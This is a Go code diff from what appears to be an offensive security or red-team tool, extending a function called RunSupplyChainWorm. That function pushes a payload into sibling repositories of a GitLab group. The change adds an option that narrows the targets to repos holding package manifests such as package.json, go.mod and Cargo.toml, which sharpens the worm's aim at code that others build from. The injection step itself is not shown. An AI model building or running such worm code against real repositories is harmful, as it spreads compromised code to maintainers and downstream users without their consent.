@@ -319,7 +319,7 @@ type SupplyChainWormResult struct {
 // RunSupplyChainWorm performs a supply chain worm attack across sibling repos.
 // Uses the GitLab SDK directly — no attacker package dependency — so it
 // compiles cleanly inside the payloads sub-package.
-func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjectID any, groupPath, payload string, maxRepos int, branch string, authorName, authorEmail string, out io.Writer) SupplyChainWormResult {
+func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjectID any, groupPath, payload string, maxRepos int, branch string, authorName, authorEmail string, out io.Writer, monorepoScope bool) SupplyChainWormResult {
 	var res SupplyChainWormResult
 	if maxRepos <= 0 {
 		maxRepos = 5
@@ -342,7 +342,7 @@ func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjec
 		targetPath = p.PathWithNamespace
 	}
 
-	siblings, listErr := discoverSiblings(ctx, client, groupPath, targetPath, maxRepos)
+	siblings, listErr := discoverSiblings(ctx, client, groupPath, targetPath, maxRepos, monorepoScope)
 	if listErr != "" {
 		res.Err = listErr
 	}
@@ -361,7 +361,7 @@ func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjec
 	return res
 }
 
-func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, targetPath string, maxRepos int) ([]int64, string) {
+func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, targetPath string, maxRepos int, monorepoScope bool) ([]int64, string) {
 	var siblings []int64
 	page := int64(1)
 	for {
@@ -389,7 +389,27 @@ func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, tar
 		}
 		page = resp.NextPage
 	}
+	if monorepoScope && len(siblings) > 0 {
+		var filtered []int64
+		for _, sid := range siblings {
+			if hasPackageManifest(ctx, client, sid) {
+				filtered = append(filtered, sid)
+			}
+		}
+		siblings = filtered
+	}
 	return siblings, ""
+}
+
+func hasPackageManifest(ctx context.Context, client *gitlab.Client, projectID int64) bool {
+	manifests := []string{"package.json", "go.mod", "Cargo.toml", "pyproject.toml", "pom.xml", "build.gradle"}
+	for _, path := range manifests {
+		_, _, err := client.RepositoryFiles.GetFile(projectID, path, &gitlab.GetFileOptions{Ref: gitlab.Ptr("HEAD")}, gitlab.WithContext(ctx))
+		if err == nil {
+			return true
+		}
+	}
+	return false
 }
 
 var stagesInlineRe = regexp.MustCompile(`(?m)^stages:\s*\[([^\]]+)\]`)
